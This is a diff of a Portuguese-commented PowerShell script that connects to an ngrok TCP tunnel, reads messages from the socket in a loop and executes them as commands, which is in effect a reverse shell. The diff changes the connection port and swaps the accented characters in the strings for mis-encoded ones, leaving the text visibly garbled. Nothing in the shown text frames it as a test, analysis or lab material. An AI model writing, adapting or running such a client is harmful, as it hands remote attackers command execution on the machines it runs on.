@@ -6,13 +6,13 @@ function Receber-Dados {
 
     $reader = New-Object System.IO.BinaryReader($stream)
 
-    Write-Host "Verificando dados disponÌveis no stream..."
+    Write-Host "Verificando dados dispon√≠veis no stream..."
     if ($stream.DataAvailable) {
-        Write-Host "Dados disponÌveis no stream. Lendo bytes..."
+        Write-Host "Dados dispon√≠veis no stream. Lendo bytes..."
         $byteArray = $reader.ReadBytes(1024)
 
         if ($byteArray.Length -gt 0) {
-            # Converte bytes para string, assumindo que a mensagem È uma string UTF-8
+            # Converte bytes para string, assumindo que a mensagem √© uma string UTF-8
             $mensagemParcial = [System.Text.Encoding]::UTF8.GetString($byteArray)
             Write-Host "Dados lidos: $mensagemParcial"
             
@@ -22,7 +22,7 @@ function Receber-Dados {
             Write-Host "Nenhum dado lido do byteArray."
         }
     } else {
-        Write-Host "Nenhum dado disponÌvel no stream."
+        Write-Host "Nenhum dado dispon√≠vel no stream."
     }
 }
 
@@ -43,7 +43,7 @@ function Processar-Mensagem {
             Write-Host "Erro ao executar o comando: $_"
         }
     } else {
-        Write-Host "Mensagem inv·lida para execuÁ„o. Ignorando..."
+        Write-Host "Mensagem inv√°lida para execu√ß√£o. Ignorando..."
     }
 }
 
@@ -54,7 +54,7 @@ try {
 
     # Conecta ao servidor
     $servidor = "0.tcp.sa.ngrok.io"
-    $port = 10359
+    $port = 18801
     try {
         Write-Host "Conectando ao servidor $servidor na porta $port..."
         $socket.Connect($servidor, $port)
@@ -64,7 +64,7 @@ try {
         exit
     }
 
-    # ObtÈm o stream de rede para leitura e escrita
+    # Obt√©m o stream de rede para leitura e escrita
     Write-Host "Obtendo o stream de rede..."
     $stream = $socket.GetStream()
 
@@ -77,8 +77,8 @@ try {
 
     # Buffer para armazenar dados recebidos
     $buffer = New-Object System.Text.StringBuilder
-    $timeout = 5000  # Tempo m·ximo de espera por dados em milissegundos
-    $minBytesToReceive = 1024  # N˙mero mÌnimo de bytes a serem verificados
+    $timeout = 5000  # Tempo m√°ximo de espera por dados em milissegundos
+    $minBytesToReceive = 1024  # N√∫mero m√≠nimo de bytes a serem verificados
 
     # Loop para receber mensagens e executar comandos
     while ($true) {
@@ -86,28 +86,28 @@ try {
             $startTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
             $dataAvailable = $false
 
-            # Verifica se h· dados disponÌveis maiores que o n˙mero mÌnimo
-            Write-Host "Verificando se h· dados maiores que $minBytesToReceive bytes..."
+            # Verifica se h√° dados dispon√≠veis maiores que o n√∫mero m√≠nimo
+            Write-Host "Verificando se h√° dados maiores que $minBytesToReceive bytes..."
             if ($stream.DataAvailable -and $stream.Length -ge $minBytesToReceive) {
-                Write-Host "Dados disponÌveis no stream. Lendo bytes..."
+                Write-Host "Dados dispon√≠veis no stream. Lendo bytes..."
                 Receber-Dados -stream $stream -buffer $buffer
                 $dataAvailable = $true
             }
 
             # Verifica o tempo limite
-            Write-Host "Iniciando verificaÁ„o de tempo limite..."
+            Write-Host "Iniciando verifica√ß√£o de tempo limite..."
             while ($true) {
                 $currentTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
                 $elapsed = ([System.Diagnostics.Stopwatch]::GetTimestamp() - $startTime) / [System.Diagnostics.Stopwatch]::Frequency * 1000
 
                 if ($elapsed -ge $timeout) {
                     # Tempo limite atingido
-                    Write-Host "Tempo limite alcanÁado. Nenhum dado recebido."
+                    Write-Host "Tempo limite alcan√ßado. Nenhum dado recebido."
                     break
                 }
 
                 if ($stream.DataAvailable -and $stream.Length -ge $minBytesToReceive) {
-                    Write-Host "Dados disponÌveis no stream. Lendo bytes..."
+                    Write-Host "Dados dispon√≠veis no stream. Lendo bytes..."
                     $dataAvailable = $true
                     Receber-Dados -stream $stream -buffer $buffer
                 }
@@ -129,7 +129,7 @@ try {
                     $buffer.Clear()
 
                     # Processa a mensagem
-                    Write-Host "Iniciando execuÁ„o do comando..."
+                    Write-Host "Iniciando execu√ß√£o do comando..."
                     Processar-Mensagem -mensagemCompleta $mensagemCompleta
                 }
             }
@@ -142,14 +142,14 @@ try {
 } catch {
     Write-Host "Erro geral: $_"
 } finally {
-    # Verifica se o socket est· aberto antes de tentar fechar
+    # Verifica se o socket est√° aberto antes de tentar fechar
     if ($socket -ne $null -and $socket.Connected) {
         try {
-            Write-Host "Fechando conex„o..."
+            Write-Host "Fechando conex√£o..."
             $socket.Close()
-            Write-Host "Conex„o fechada."
+            Write-Host "Conex√£o fechada."
         } catch {
-            Write-Host "Erro ao fechar a conex„o: $_"
+            Write-Host "Erro ao fechar a conex√£o: $_"
         }
     }
 }
